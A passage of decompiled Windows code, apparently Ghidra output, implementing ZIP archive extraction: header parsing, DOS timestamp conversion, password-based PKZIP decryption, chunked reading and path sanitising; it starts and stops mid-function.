    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_004085a0();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  uStack_10 = uStack_44 >> 0x10 & 0x1f;
  iStack_8 = (uStack_44 >> 0x19) + 0x7bc;
  iStack_c = (uStack_44 >> 0x15 & 0xf) - 1;
  uStack_14 = uStack_44 >> 0xb & 0x1f;
  uStack_18 = uStack_44 >> 5 & 0x3f;
  iStack_1c = (uStack_44 & 0x1f) * 2;
  iVar2 = FUN_004085a0();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  iVar2 = FUN_004085a0();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  iVar2 = FUN_004085a0();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  iVar2 = FUN_00408510(&local_58);
  uStack_34 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00408510(&local_58), iVar2 == 0)) {
    uStack_34 = local_58 * 0x100 + uStack_34;
  }
  else {
    uStack_34 = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00408510(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00408510(&local_58), iVar2 == 0)) {
    iStack_30 = local_58 * 0x100 + uVar3;
  }
  else {
    iStack_30 = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00408510(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00408510(&local_58), iVar2 == 0)) {
    iStack_2c = local_58 * 0x100 + uVar3;
  }
  else {
    iStack_2c = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00408510(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00408510(&local_58), iVar2 == 0)) {
    iStack_28 = local_58 * 0x100 + uVar3;
  }
  else {
    iStack_28 = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00408510(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00408510(&local_58), iVar2 == 0)) {
    iStack_24 = local_58 * 0x100 + uVar3;
  }
  else {
    iStack_24 = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_004085a0();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  iVar2 = FUN_004085a0();
  if (iVar2 != 0) {
    return -1;
  }
  if (local_5c == 0) {
    if (param_3 != (undefined4 *)0x0) {
      if (uStack_34 < param_4) {
        *(undefined *)(uStack_34 + (int)param_3) = 0;
      }
      if (((uStack_34 != 0) && (param_4 != 0)) &&
         (uVar3 = FUN_004084b0(param_4,param_3,1), uVar3 != 1)) {
        return -1;
      }
    }
    if (param_1 != (int *)0x0) {
      piVar4 = aiStack_54;
      for (iVar2 = 0x14; iVar2 != 0; iVar2 = iVar2 + -1) {
        *param_1 = *piVar4;
        piVar4 = piVar4 + 1;
        param_1 = param_1 + 1;
      }
    }
    if (param_2 != (uint *)0x0) {
      *param_2 = local_58;
    }
  }
  return local_5c;
}



int FUN_00408ed0(void)

{
  int iVar1;
  int unaff_ESI;
  
  if (unaff_ESI == 0) {
    return -0x66;
  }
  *(undefined4 *)(unaff_ESI + 0x14) = *(undefined4 *)(unaff_ESI + 0x24);
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  iVar1 = FUN_00408a80((int *)(unaff_ESI + 0x28),(uint *)(unaff_ESI + 0x78),(undefined4 *)0x0,0);
  *(uint *)(unaff_ESI + 0x18) = (uint)(iVar1 == 0);
  return iVar1;
}



int __cdecl FUN_00408f10(char **param_1,char **param_2,char **param_3)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  int iVar4;
  char *pcVar5;
  int iVar6;
  char **unaff_EDI;
  char *pcStack_8;
  char *local_4;
  
  iVar6 = 0;
  *param_1 = (char *)0x0;
  pcVar5 = unaff_EDI[3];
  pcVar2 = unaff_EDI[0x1e];
  *param_2 = (char *)0x0;
  pcVar3 = *unaff_EDI;
  cVar1 = *pcVar3;
  *param_3 = (char *)0x0;
  if (cVar1 == '\0') {
    *(char **)(pcVar3 + 0x1c) = pcVar5 + (int)pcVar2;
  }
  else {
    if (pcVar3[1] == '\0') {
      return -1;
    }
    SetFilePointer(*(HANDLE *)(pcVar3 + 4),(LONG)(pcVar5 + (int)pcVar2 + *(int *)(pcVar3 + 0xc)),
                   (PLONG)0x0,0);
  }
  iVar4 = FUN_004085a0();
  if (iVar4 == 0) {
    if (local_4 != (char *)0x4034b50) {
      iVar6 = -0x67;
    }
  }
  else {
    iVar6 = -1;
  }
  iVar4 = FUN_00408510((uint *)&local_4);
  if (iVar4 == 0) {
    iVar4 = FUN_00408510((uint *)&local_4);
    if (iVar4 != 0) goto LAB_00408fa3;
  }
  else {
LAB_00408fa3:
    iVar6 = -1;
  }
  iVar4 = FUN_00408510((uint *)&local_4);
  pcVar5 = local_4;
  if (iVar4 == 0) {
    iVar4 = FUN_00408510((uint *)&local_4);
    if (iVar4 != 0) goto LAB_00408fdd;
    local_4 = pcVar5 + (int)local_4 * 0x100;
  }
  else {
LAB_00408fdd:
    local_4 = (char *)0x0;
    if (iVar4 != 0) {
      iVar6 = -1;
    }
  }
  iVar4 = FUN_00408510((uint *)&pcStack_8);
  pcVar5 = pcStack_8;
  if (iVar4 == 0) {
    iVar4 = FUN_00408510((uint *)&pcStack_8);
    if (iVar4 != 0) goto LAB_00409060;
    pcStack_8 = pcVar5 + (int)pcStack_8 * 0x100;
LAB_00409021:
    if ((iVar6 == 0) &&
       ((pcVar5 = unaff_EDI[0xd], pcStack_8 != pcVar5 ||
        ((pcVar5 != (char *)0x0 && (pcVar5 != (char *)0x8)))))) {
      iVar6 = -0x67;
    }
  }
  else {
LAB_00409060:
    pcStack_8 = (char *)0x0;
    if (iVar4 == 0) goto LAB_00409021;
    iVar6 = -1;
  }
  iVar4 = FUN_004085a0();
  if (iVar4 != 0) {
    iVar6 = -1;
  }
  iVar4 = FUN_004085a0();
  if (iVar4 == 0) {
    if (((iVar6 == 0) && (pcStack_8 != unaff_EDI[0xf])) && (((uint)local_4 & 8) == 0)) {
      iVar6 = -0x67;
    }
  }
  else {
    iVar6 = -1;
  }
  iVar4 = FUN_004085a0();
  if (iVar4 == 0) {
    if (((iVar6 == 0) && (pcStack_8 != unaff_EDI[0x10])) && (((uint)local_4 & 8) == 0)) {
      iVar6 = -0x67;
    }
  }
  else {
    iVar6 = -1;
  }
  iVar4 = FUN_004085a0();
  if (iVar4 == 0) {
    if (((iVar6 == 0) && (pcStack_8 != unaff_EDI[0x11])) && (((uint)local_4 & 8) == 0)) {
      iVar6 = -0x67;
    }
  }
  else {
    iVar6 = -1;
  }
  iVar4 = FUN_00408510((uint *)&local_4);
  pcStack_8 = local_4;
  if (iVar4 == 0) {
    iVar4 = FUN_00408510((uint *)&local_4);
    if (iVar4 != 0) goto LAB_00409166;
    pcVar5 = pcStack_8 + (int)local_4 * 0x100;
LAB_00409119:
    if ((iVar6 == 0) && (pcVar5 != unaff_EDI[0x12])) {
      iVar6 = -0x67;
    }
  }
  else {
LAB_00409166:
    pcVar5 = (char *)0x0;
    if (iVar4 == 0) goto LAB_00409119;
    iVar6 = -1;
  }
  *param_1 = *param_1 + (int)pcVar5;
  iVar4 = FUN_00408510((uint *)&local_4);
  pcStack_8 = local_4;
  if (iVar4 == 0) {
    iVar4 = FUN_00408510((uint *)&local_4);
    if (iVar4 == 0) {
      pcStack_8 = pcStack_8 + (int)local_4 * 0x100;
      goto LAB_0040917a;
    }
  }
  pcStack_8 = (char *)0x0;
  if (iVar4 != 0) {
    iVar6 = -1;
  }
LAB_0040917a:
  *param_2 = unaff_EDI[0x1e] + 0x1e + (int)pcVar5;
  *param_3 = pcStack_8;
  *param_1 = *param_1 + (int)pcStack_8;
  return iVar6;
}



undefined4 __cdecl FUN_004091a0(char *param_1)

{
  LPVOID *in_EAX;
  int iVar1;
  LPVOID *ppvVar2;
  LPVOID pvVar3;
  LPVOID *ppvVar4;
  LPVOID *extraout_EDX;
  char *local_c;
  char *local_8;
  char *local_4;
  
  if ((in_EAX == (LPVOID *)0x0) || (in_EAX[6] == (LPVOID)0x0)) {
    return 0xffffff9a;
  }
  if (in_EAX[0x1f] != (LPVOID)0x0) {
    FUN_00409590();
  }
  iVar1 = FUN_00408f10(&local_4,&local_c,&local_8);
  if (iVar1 != 0) {
    return 0xffffff99;
  }
  ppvVar2 = (LPVOID *)FUN_0040afc0(0x84);
  if (ppvVar2 != (LPVOID *)0x0) {
    pvVar3 = FUN_0040afc0(0x4000);
    *ppvVar2 = pvVar3;
    ppvVar2[0x11] = local_c;
    ppvVar2[0x12] = local_8;
    ppvVar2[0x13] = (LPVOID)0x0;
    if (pvVar3 != (LPVOID)0x0) {
      ppvVar2[0x10] = (LPVOID)0x0;
      pvVar3 = in_EAX[0xd];
      ppvVar2[0x15] = in_EAX[0xf];
      ppvVar2[0x14] = (LPVOID)0x0;
      ppvVar2[0x19] = in_EAX[0xd];
      ppvVar2[0x18] = *in_EAX;
      ppvVar2[0x1a] = in_EAX[3];
      ppvVar2[6] = (LPVOID)0x0;
      if (pvVar3 != (LPVOID)0x0) {
        ppvVar2[9] = (LPVOID)0x0;
        ppvVar2[10] = (LPVOID)0x0;
        ppvVar2[0xb] = (LPVOID)0x0;
        iVar1 = FUN_00408060();
        if (iVar1 == 0) {
          ppvVar2[0x10] = (LPVOID)0x1;
        }
      }
      ppvVar2[0x16] = in_EAX[0x10];
      ppvVar2[0x17] = in_EAX[0x11];
      *(byte *)(ppvVar2 + 0x1b) = *(byte *)(in_EAX + 0xc) & 1;
      if (((uint)in_EAX[0xc] >> 3 & 1) == 0) {
        *(undefined *)(ppvVar2 + 0x20) = *(undefined *)((int)in_EAX + 0x3f);
      }
      else {
        *(undefined *)(ppvVar2 + 0x20) = *(undefined *)((int)in_EAX + 0x39);
      }
      ppvVar4 = ppvVar2 + 0x1c;
      ppvVar2[0x1f] = (LPVOID)(-(uint)(*(char *)(ppvVar2 + 0x1b) != '\0') & 0xc);
      *ppvVar4 = (LPVOID)0x12345678;
      ppvVar2[0x1d] = (LPVOID)0x23456789;
      ppvVar2[0x1e] = (LPVOID)0x34567890;
      if (param_1 != (char *)0x0) {
        do {
          if (*param_1 == '\0') break;
          FUN_00407d50(*param_1,(uint *)ppvVar4);
          param_1 = param_1 + 1;
          ppvVar4 = extraout_EDX;
        } while (param_1 != (char *)0x0);
      }
      ppvVar2[0xf] = local_4 + (int)in_EAX[0x1e] + 0x1e;
      ppvVar2[2] = (LPVOID)0x0;
      in_EAX[0x1f] = ppvVar2;
      return 0;
    }
    FUN_0040b61e();
  }
  return 0xffffff98;
}



int __thiscall FUN_00409320(void *this,int param_1,undefined *param_2)

{
  int *piVar1;
  char cVar2;
  int *piVar3;
  char *pcVar4;
  byte *pbVar5;
  undefined uVar6;
  int in_EAX;
  uint uVar7;
  uint uVar8;
  int iVar9;
  int extraout_ECX;
  int local_c;
  int local_8;
  
  local_8 = 0;
  local_c = 0;
  if (param_2 != (undefined *)0x0) {
    *param_2 = 0;
  }
  if ((in_EAX == 0) || (piVar3 = *(int **)(in_EAX + 0x7c), piVar3 == (int *)0x0)) {
    return -0x66;
  }
  if (*piVar3 == 0) {
    return -100;
  }
  if (this != (void *)0x0) {
    piVar3[4] = param_1;
    piVar3[5] = (int)this;
    if ((void *)piVar3[0x17] < this) {
      piVar3[5] = (int)(void *)piVar3[0x17];
    }
    if (piVar3[5] != 0) {
      do {
        if ((piVar3[2] == 0) && (uVar7 = piVar3[0x16], uVar7 != 0)) {
          uVar8 = 0x4000;
          if ((uVar7 < 0x4000) && (uVar8 = uVar7, uVar7 == 0)) {
            if (param_2 == (undefined *)0x0) {
              return 0;
            }
            *param_2 = 1;
            return 0;
          }
          pcVar4 = (char *)piVar3[0x18];
          iVar9 = piVar3[0x1a] + piVar3[0xf];
          if (*pcVar4 == '\0') {
            *(int *)(pcVar4 + 0x1c) = iVar9;
          }
          else {
            if (pcVar4[1] == '\0') {
              return -1;
            }
            SetFilePointer(*(HANDLE *)(pcVar4 + 4),*(int *)(pcVar4 + 0xc) + iVar9,(PLONG)0x0,0);
            iVar9 = extraout_ECX;
          }
          uVar7 = FUN_004084b0(iVar9,(undefined4 *)*piVar3,1);
          if (uVar7 != 1) {
            return -1;
          }
          iVar9 = *piVar3;
          piVar3[0xf] = piVar3[0xf] + uVar8;
          piVar3[0x16] = piVar3[0x16] - uVar8;
          piVar3[1] = iVar9;
          piVar3[2] = uVar8;
          if ((*(char *)(piVar3 + 0x1b) != '\0') && (uVar7 = 0, uVar8 != 0)) {
            do {
              uVar6 = FUN_00407da0();
              *(undefined *)(uVar7 + iVar9) = uVar6;
              uVar7 = uVar7 + 1;
            } while (uVar7 < uVar8);
          }
        }
        uVar7 = piVar3[2];
        uVar8 = piVar3[0x1f];
        if (uVar7 < (uint)piVar3[0x1f]) {
          uVar8 = uVar7;
        }
        if (uVar8 != 0) {
          cVar2 = *(char *)(piVar3[1] + uVar8 + -1);
          piVar3[0x17] = piVar3[0x17] - uVar8;
          piVar1 = piVar3 + 0x1f;
          *piVar1 = *piVar1 - uVar8;
          piVar3[2] = uVar7 - uVar8;
          piVar3[1] = piVar3[1] + uVar8;
          if ((*piVar1 == 0) && (cVar2 != *(char *)(piVar3 + 0x20))) {
            return -0x6a;
          }
        }
        if (piVar3[0x19] == 0) {
          uVar7 = piVar3[2];
          if ((uint)piVar3[5] < (uint)piVar3[2]) {
            uVar7 = piVar3[5];
          }
          uVar8 = 0;
          if (uVar7 != 0) {
            do {
              *(undefined *)(uVar8 + piVar3[4]) = *(undefined *)(uVar8 + piVar3[1]);
              uVar8 = uVar8 + 1;
            } while (uVar8 < uVar7);
          }
          pbVar5 = (byte *)piVar3[4];
          uVar8 = FUN_00407c40(pbVar5,uVar7);
          piVar3[0x17] = piVar3[0x17] - uVar7;
          piVar3[2] = piVar3[2] - uVar7;
          piVar3[5] = piVar3[5] - uVar7;
          piVar3[1] = piVar3[1] + uVar7;
          piVar3[6] = piVar3[6] + uVar7;
          local_c = local_c + uVar7;
          piVar3[0x14] = uVar8;
          piVar3[4] = (int)(pbVar5 + uVar7);
          if ((piVar3[0x17] == 0) && (param_2 != (undefined *)0x0)) {
            *param_2 = 1;
          }
        }
        else {
          pbVar5 = (byte *)piVar3[4];
          iVar9 = piVar3[6];
          local_8 = FUN_00408110();
          uVar8 = piVar3[6] - iVar9;
          uVar7 = FUN_00407c40(pbVar5,uVar8);
          piVar3[0x17] = piVar3[0x17] - uVar8;
          local_c = local_c + uVar8;
          piVar3[0x14] = uVar7;
          if ((local_8 == 1) || (piVar3[0x17] == 0)) {
            if (param_2 == (undefined *)0x0) {
              return local_c;
            }
            *param_2 = 1;
            return local_c;
          }
          if (local_8 != 0) {
            return local_8;
          }
        }
      } while (piVar3[5] != 0);
      if (local_8 != 0) {
        return local_8;
      }
    }
    return local_c;
  }
  return 0;
}



undefined4 FUN_00409590(void)

{
  int *piVar1;
  undefined4 uVar2;
  int unaff_EDI;
  
  uVar2 = 0;
  if (unaff_EDI == 0) {
    return 0xffffff9a;
  }
  piVar1 = *(int **)(unaff_EDI + 0x7c);
  if (piVar1 == (int *)0x0) {
    return 0xffffff9a;
  }
  if ((piVar1[0x17] == 0) && (piVar1[0x14] != piVar1[0x15])) {
    uVar2 = 0xffffff97;
  }
  if (*piVar1 != 0) {
    FUN_0040b61e();
    *piVar1 = 0;
  }
  *piVar1 = 0;
  if (piVar1[0x10] != 0) {
    FUN_00408010();
  }
  piVar1[0x10] = 0;
  FUN_0040b61e();
  *(undefined4 *)(unaff_EDI + 0x7c) = 0;
  return uVar2;
}



_FILETIME __fastcall FUN_00409610(uint param_1)

{
  uint in_EAX;
  _FILETIME local_1c;
  SYSTEMTIME local_14;
  
  local_14.wYear = ((ushort)param_1 >> 9) + 0x7bc;
  local_14.wMonth = (ushort)(param_1 >> 5) & 0xf;
  local_14.wDay = (ushort)param_1 & 0x1f;
  local_14.wHour = (ushort)in_EAX >> 0xb;
  local_14.wMinute = (ushort)(in_EAX >> 5) & 0x3f;
  local_14.wSecond = ((ushort)in_EAX & 0x1f) * 2;
  local_14.wMilliseconds = 0;
  SystemTimeToFileTime(&local_14,&local_1c);
  return local_1c;
}



void FUN_00409690(void)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  undefined4 *unaff_ESI;
  
  unaff_ESI[1] = 0xffffffff;
  unaff_ESI[0x8e] = 0xffffffff;
  *unaff_ESI = 0;
  unaff_ESI[0x8f] = 0;
  unaff_ESI[0x90] = 0;
  pcVar2 = &DAT_0041ddd4;
  do {
    pcVar3 = pcVar2;
    pcVar2 = pcVar3 + 1;
  } while (*pcVar3 != '\0');
  pcVar2 = (char *)FUN_0040b8c1((uint)(pcVar3 + -0x41ddd3));
  unaff_ESI[0x8f] = pcVar2;
  pcVar3 = &DAT_0041ddd4;
  do {
    cVar1 = *pcVar3;
    *pcVar2 = cVar1;
    pcVar3 = pcVar3 + 1;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  return;
}



int FUN_004096f0(undefined4 param_1,undefined4 param_2)

{
  short *psVar1;
  WCHAR WVar2;
  short sVar3;
  int **lpBuffer;
  undefined *puVar4;
  int *piVar5;
  int **unaff_ESI;
  undefined4 *puVar6;
  
  if ((*unaff_ESI == (int *)0x0) && (unaff_ESI[1] == (int *)0xffffffff)) {
    lpBuffer = unaff_ESI + 0x91;
    GetCurrentDirectoryW(0x104,(LPWSTR)lpBuffer);
    do {
      WVar2 = *(WCHAR *)lpBuffer;
      lpBuffer = (int **)((int)lpBuffer + 2);
    } while (WVar2 != L'\0');
    sVar3 = *(short *)((int)unaff_ESI + ((int)lpBuffer - ((int)unaff_ESI + 0x246) >> 1) * 2 + 0x242)
    ;
    if ((sVar3 != 0x5c) && (sVar3 != 0x2f)) {
      puVar6 = (undefined4 *)((int)unaff_ESI + 0x242);
      do {
        psVar1 = (short *)((int)puVar6 + 2);
        puVar6 = (undefined4 *)((int)puVar6 + 2);
      } while (*psVar1 != 0);
      *puVar6 = DAT_0041dc88;
    }
    puVar4 = (undefined *)FUN_0040b8c1(0x20);
    *puVar4 = 0;
    puVar4[1] = 1;
    puVar4[0x10] = 0;
    *(undefined4 *)(puVar4 + 0x14) = param_1;
    *(undefined4 *)(puVar4 + 0x18) = param_2;
    *(undefined4 *)(puVar4 + 0x1c) = 0;
    *(undefined4 *)(puVar4 + 0xc) = 0;
    piVar5 = FUN_004087f0();
    *unaff_ESI = piVar5;
    return (-(uint)(piVar5 != (int *)0x0) & 0xfffffe00) + 0x200;
  }
  return 0x1000000;
}



void __fastcall FUN_004097b0(int *param_1,char **param_2,char **param_3,int *param_4)

{
  WCHAR WVar1;
  char *pcVar2;
  int3 iVar3;
  _FILETIME _Var4;
  undefined4 *puVar5;
  byte bVar6;
  int iVar7;
  char *pcVar8;
  short *psVar9;
  undefined4 *puVar10;
  uint uVar11;
  byte bVar12;
  int iVar13;
  undefined4 extraout_ECX;
  byte *pbVar14;
  byte bVar15;
  char **extraout_EDX;
  char **extraout_EDX_00;
  char **extraout_EDX_01;
  byte bVar16;
  int *piVar17;
  WCHAR *pWVar18;
  bool bVar19;
  longlong lVar20;
  undefined auStack_394 [5];
  byte bStack_38f;
  undefined uStack_38e;
  undefined uStack_38d;
  undefined4 local_38c;
  undefined4 *local_388;
  int *local_384;
  _FILETIME _Stack_380;
  _FILETIME _Stack_378;
  char *local_370;
  uint local_36c [4];
  uint uStack_35c;
  int iStack_354;
  int iStack_350;
  uint uStack_338;
  undefined4 local_31c [66];
  WCHAR aWStack_214 [262];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)auStack_394;
  local_384 = param_1;
  if (((int)param_3 < -1) || (*(int *)(*param_1 + 4) <= (int)param_3)) goto LAB_00409d4a;
  if (param_1[1] != -1) {
    FUN_00409590();
    param_2 = extraout_EDX;
  }
  _Var4.dwHighDateTime = _Stack_378.dwHighDateTime;
  _Var4.dwLowDateTime = _Stack_378.dwLowDateTime;
  param_1[1] = -1;
  if (param_3 == (char **)param_1[0x8e]) {
    if (param_3 != (char **)0xffffffff) {
      piVar17 = param_1 + 2;
      for (iVar13 = 0x8c; iVar13 != 0; iVar13 = iVar13 + -1) {
        *param_4 = *piVar17;
        piVar17 = piVar17 + 1;
        param_4 = param_4 + 1;
      }
      goto LAB_00409d4a;
    }
  }
  else if (param_3 != (char **)0xffffffff) {
    if ((int)param_3 < *(int *)(*param_1 + 0x10)) {
      FUN_00408ed0();
    }
    iVar13 = *(int *)(*param_1 + 0x10);
    while (iVar13 < (int)param_3) {
      iVar13 = *param_1;
      if (((iVar13 != 0) && (*(int *)(iVar13 + 0x18) != 0)) &&
         (iVar7 = *(int *)(iVar13 + 0x10) + 1, iVar7 != *(int *)(iVar13 + 4))) {
        *(int *)(iVar13 + 0x14) =
             *(int *)(iVar13 + 0x14) +
             *(int *)(iVar13 + 0x50) + *(int *)(iVar13 + 0x4c) + 0x2e + *(int *)(iVar13 + 0x48);
        *(int *)(iVar13 + 0x10) = iVar7;
        iVar7 = FUN_00408a80((int *)(iVar13 + 0x28),(uint *)(iVar13 + 0x78),(undefined4 *)0x0,0);
        *(uint *)(iVar13 + 0x18) = (uint)(iVar7 == 0);
      }
      iVar13 = *(int *)(*param_1 + 0x10);
    }
    FUN_00408a80((int *)local_36c,(uint *)0x0,local_31c,0x104);
    iVar13 = FUN_00408f10(&local_370,(char **)&local_388,(char **)&local_38c);
    param_2 = extraout_EDX_00;
    if (iVar13 != 0) goto LAB_00409d4a;
    param_2 = (char **)*param_1;
    pcVar2 = *param_2;
    if (*pcVar2 == '\0') {
      *(undefined4 **)(pcVar2 + 0x1c) = local_388;
LAB_00409954:
      pcVar2 = local_38c;
      local_388 = (undefined4 *)FUN_0040b8c1((uint)local_38c);
      pcVar8 = (char *)FUN_004084b0(extraout_ECX,local_388,(uint)pcVar2);
      if (pcVar8 == pcVar2) {
        *param_4 = *(int *)(*local_384 + 0x10);
        MultiByteToWideChar(0xfde9,0,(LPCSTR)local_31c,-1,aWStack_214,0x104);
        pWVar18 = aWStack_214;
        while( true ) {
          while( true ) {
            while( true ) {
              while( true ) {
                while( true ) {
                  while( true ) {
                    for (; (WVar1 = *pWVar18, WVar1 != L'\0' && (pWVar18[1] == L':'));
                        pWVar18 = pWVar18 + 2) {
                    }
                    if (WVar1 != L'\\') break;
                    pWVar18 = pWVar18 + 1;
                  }
                  if (WVar1 != L'/') break;
                  pWVar18 = pWVar18 + 1;
                }
                psVar9 = FUN_0040aadd(pWVar18,u______0041ffbc);
                if (psVar9 == (short *)0x0) break;
                pWVar18 = psVar9 + 4;
              }
              psVar9 = FUN_0040aadd(pWVar18,u______0041ffc8);
              if (psVar9 == (short *)0x0) break;
              pWVar18 = psVar9 + 4;
            }
            psVar9 = FUN_0040aadd(pWVar18,u______0041ffd4);
            if (psVar9 == (short *)0x0) break;
            pWVar18 = psVar9 + 4;
          }
          psVar9 = FUN_0040aadd(pWVar18,u______0041ffe0);
          if (psVar9 == (short *)0x0) break;
          pWVar18 = psVar9 + 4;
        }
        iVar13 = 4 - (int)pWVar18;
        do {
          WVar1 = *pWVar18;
          *(WCHAR *)((int)param_4 + iVar13 + (int)pWVar18) = WVar1;
          pWVar18 = pWVar18 + 1;
        } while (WVar1 != L'\0');
        bVar15 = ~(byte)(uStack_338 >> 0x17);
        local_36c[0] = local_36c[0] >> 8;
        bVar12 = (byte)(uStack_338 >> 0x1e);
        uStack_38d = 0;
        bStack_38f = 0;
        uStack_38e = 1;
        if (((local_36c[0] == 0) || (local_36c[0] == 7)) ||
           ((local_36c[0] == 0xb || (local_36c[0] == 0xe)))) {
          bStack_38f = (byte)(uStack_338 >> 2) & 1;
          bVar15 = (byte)uStack_338;
          bVar16 = (byte)(uStack_338 >> 1) & 1;
          bVar12 = (byte)(uStack_338 >> 4);
          bVar6 = (byte)(uStack_338 >> 5) & 1;
        }
        else {
          bVar16 = 0;
          bVar6 = 1;
        }
        iVar13 = 0;
        param_4[0x83] = 0;
        if ((bVar12 & 1) != 0) {
          param_4[0x83] = 0x10;
        }
        if (bVar6 != 0) {
          param_4[0x83] = param_4[0x83] | 0x20;
        }
        if (bVar16 != 0) {
          param_4[0x83] = param_4[0x83] | 2;
        }
        if ((bVar15 & 1) != 0) {
          param_4[0x83] = param_4[0x83] | 1;
        }
        if (bStack_38f != 0) {
          param_4[0x83] = param_4[0x83] | 4;
        }
        param_4[0x8a] = iStack_354;
        param_4[0x8b] = iStack_350;
        _Stack_378 = FUN_00409610(uStack_35c >> 0x10);
        LocalFileTimeToFileTime(&_Stack_378,&_Stack_380);
        puVar5 = local_388;
        pcVar2 = local_38c;
        param_4[0x84] = _Stack_380.dwLowDateTime;
        param_4[0x85] = _Stack_380.dwHighDateTime;
        param_4[0x86] = _Stack_380.dwLowDateTime;
        param_4[0x87] = _Stack_380.dwHighDateTime;
        param_4[0x88] = _Stack_380.dwLowDateTime;
        param_4[0x89] = _Stack_380.dwHighDateTime;
        if ((char *)0x4 < local_38c) {
          local_38c = (char *)((uint)local_38c & 0xff000000);
          do {
            local_38c = (char *)CONCAT31(CONCAT21(local_38c._2_2_,
                                                  *(undefined *)((int)local_388 + iVar13 + 1)),
                                         *(undefined *)(iVar13 + (int)local_388));
            pbVar14 = &DAT_0041ffec;
            puVar10 = &local_38c;
            do {
              bVar15 = *(byte *)puVar10;
              bVar19 = bVar15 < *pbVar14;
              if (bVar15 != *pbVar14) {
LAB_00409be0:
                iVar7 = (1 - (uint)bVar19) - (uint)(bVar19 != 0);
                goto LAB_00409be5;
              }
              if (bVar15 == 0) break;
              bVar15 = *(byte *)((int)puVar10 + 1);
              bVar19 = bVar15 < pbVar14[1];
              if (bVar15 != pbVar14[1]) goto LAB_00409be0;
              puVar10 = (undefined4 *)((int)puVar10 + 2);
              pbVar14 = pbVar14 + 2;
            } while (bVar15 != 0);
            iVar7 = 0;
LAB_00409be5:
            if (iVar7 == 0) {
              bVar15 = *(byte *)(iVar13 + 4 + (int)local_388);
              bStack_38f = bVar15 >> 2 & 1;
              iVar7 = iVar13 + 5;
              if ((bVar15 & 1) != 0) {
                iVar3 = CONCAT21(CONCAT11(*(undefined *)(iVar13 + 8 + (int)local_388),
                                          *(undefined *)(iVar13 + 7 + (int)local_388)),
                                 *(undefined *)(iVar13 + 6 + (int)local_388));
                uVar11 = CONCAT31(iVar3,*(undefined *)(iVar7 + (int)local_388));
                iVar7 = iVar13 + 9;
                lVar20 = FUN_00412360(uVar11 + 0xb6109100,
                                      ((int)iVar3 >> 0x17) + 2 + (uint)(0x49ef6eff < uVar11),
                                      10000000,0);
                *(longlong *)(param_4 + 0x88) = lVar20;
              }
              if ((bVar15 >> 1 & 1) != 0) {
                iVar3 = CONCAT21(CONCAT11(*(undefined *)(iVar7 + 3 + (int)puVar5),
                                          *(undefined *)(iVar7 + 2 + (int)puVar5)),
                                 *(undefined *)(iVar7 + 1 + (int)puVar5));
                uVar11 = CONCAT31(iVar3,*(undefined *)(iVar7 + (int)puVar5));
                iVar7 = iVar7 + 4;
                lVar20 = FUN_00412360(uVar11 + 0xb6109100,
                                      ((int)iVar3 >> 0x17) + 2 + (uint)(0x49ef6eff < uVar11),
                                      10000000,0);
                *(longlong *)(param_4 + 0x84) = lVar20;
              }
              if (bStack_38f != 0) {
                iVar3 = CONCAT21(CONCAT11(*(undefined *)(iVar7 + 3 + (int)puVar5),
                                          *(undefined *)(iVar7 + 2 + (int)puVar5)),
                                 *(undefined *)(iVar7 + 1 + (int)puVar5));
                uVar11 = CONCAT31(iVar3,*(undefined *)(iVar7 + (int)puVar5));
                lVar20 = FUN_00412360(uVar11 + 0xb6109100,
                                      ((int)iVar3 >> 0x17) + 2 + (uint)(0x49ef6eff < uVar11),
                                      10000000,0);
                *(longlong *)(param_4 + 0x86) = lVar20;
              }
              break;
            }
            iVar13 = iVar13 + 4 + (uint)*(byte *)(iVar13 + 2 + (int)local_388);
          } while ((char *)(iVar13 + 4U) < pcVar2);
        }
        if (puVar5 != (undefined4 *)0x0) {
          FUN_0040b6ac();
        }
        piVar17 = local_384 + 2;
        for (iVar13 = 0x8c; iVar13 != 0; iVar13 = iVar13 + -1) {
          *piVar17 = *param_4;
          param_4 = param_4 + 1;
          piVar17 = piVar17 + 1;
        }
        local_384[0x8e] = (int)param_3;
        param_2 = param_3;
        goto LAB_00409d4a;
      }
      FUN_0040b6ac();
      param_2 = extraout_EDX_01;
    }
    else if (pcVar2[1] != '\0') {
      SetFilePointer(*(HANDLE *)(pcVar2 + 4),*(int *)(pcVar2 + 0xc) + (int)local_388,(PLONG)0x0,0);
      goto LAB_00409954;
    }
    goto LAB_00409d4a;
  }
  *param_4 = *(int *)(*param_1 + 4);
  *(undefined2 *)(param_4 + 1) = 0;
  param_4[0x83] = 0;
  param_4[0x84] = 0;
  param_4[0x85] = 0;
  param_4[0x86] = 0;
  param_4[0x87] = 0;
  param_4[0x88] = 0;
  param_4[0x89] = 0;
  param_4[0x8a] = 0;
  param_4[0x8b] = 0;
  param_2 = (char **)0x0;
  _Stack_378 = _Var4;
LAB_00409d4a:
  FUN_0040a982(local_8 ^ (uint)auStack_394,param_2);
  return;
}



void __fastcall FUN_00409d70(undefined4 param_1,undefined4 param_2,int param_3,void *param_4)

{
  int iVar1;
  int iVar2;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar3;
  int *unaff_EBX;
  undefined auStack_8 [3];
  char local_5;
  uint local_4;
  
